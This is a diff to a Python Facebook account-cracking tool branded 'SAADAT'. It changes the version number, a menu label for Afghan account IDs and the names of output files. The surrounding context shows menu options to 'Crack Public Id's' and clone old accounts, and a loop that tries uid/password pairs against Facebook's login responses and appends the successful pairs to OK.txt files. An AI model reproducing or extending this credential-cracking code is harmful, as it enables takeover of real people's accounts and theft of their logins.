@@ -393,7 +393,7 @@ logo = """\033[1;30m
 \033[1;39m━▷ \033[0;91m𝙔𝙊𝙐𝙏𝙐𝘽𝙀  \033[1;39m◈✙◈ \033[1;32m SAADAT TECHZNICAL
 \033[1;39m━▷ \033[0;91m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m◈✙◈ \033[1;33m RAZIEQ ULLAH SAADAT
 \033[1;39m━▷ \033[0;91m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m◈✙◈ \033[0;92mFREE RNDM
-\033[1;39m━▷ \033[0;91m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m◈✙◈ \033[1;31m2.0.2
+\033[1;39m━▷ \033[0;91m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m◈✙◈ \033[1;31m2.0.3
 \033[1;39m━▷ \033[1;36m𝙁𝙀𝙀𝙇 𝙏𝙃𝙀 𝙋𝙊𝙒𝙀𝙍 𝙊𝙁 SAADAT
 \033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37mSAADAT\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●"""
  
@@ -439,7 +439,7 @@ class Main:
 		print(" \033[1;39m━▷ \033[1;32m【2】 \033[1;34mCrack Public Id's")
 		print(" \033[1;39m━▷ \033[1;33m【3】 \033[1;33mFacebook Group help ")
 		print(" \033[1;39m━▷ \033[1;34m【4】 \033[1;32mOld Cloning Id's 2006-10 \033[0;92m ✓ (Best)")
-		print(" \033[1;39m━▷ \033[1;35m【5】 \033[1;37mAFG New Id's 2011-2023\033[0;92m  ✓ (Best) ")
+		print(" \033[1;39m━▷ \033[1;35m【5】 \033[1;37mAfghanistan New Id's 2011-2023\033[0;92m  ✓ (Best) ")
 		print(" \033[1;39m━▷ \033[0;91m【E】 Exit \n")
 		MAINUL =input(" \033[1;35mChoice : ")
 		if MAINUL in ["1", "01"]:
@@ -885,12 +885,12 @@ class Main:
 				print("\r \033[0;92m[SAADAT!-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-SAADAT!-OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2011-2023-SAADAT!-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[SAADAT!-OK] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-SAADAT!-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2011-2023-SAADAT!-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1320,12 +1320,12 @@ class Main:
 				print("\r \033[0;92m[SAADAT!-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-SAADAT!-OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2011-2023-SAADAT!-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;93m[SAADAT!-OK] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-SW4T!-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2011-2023-Saadat!-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
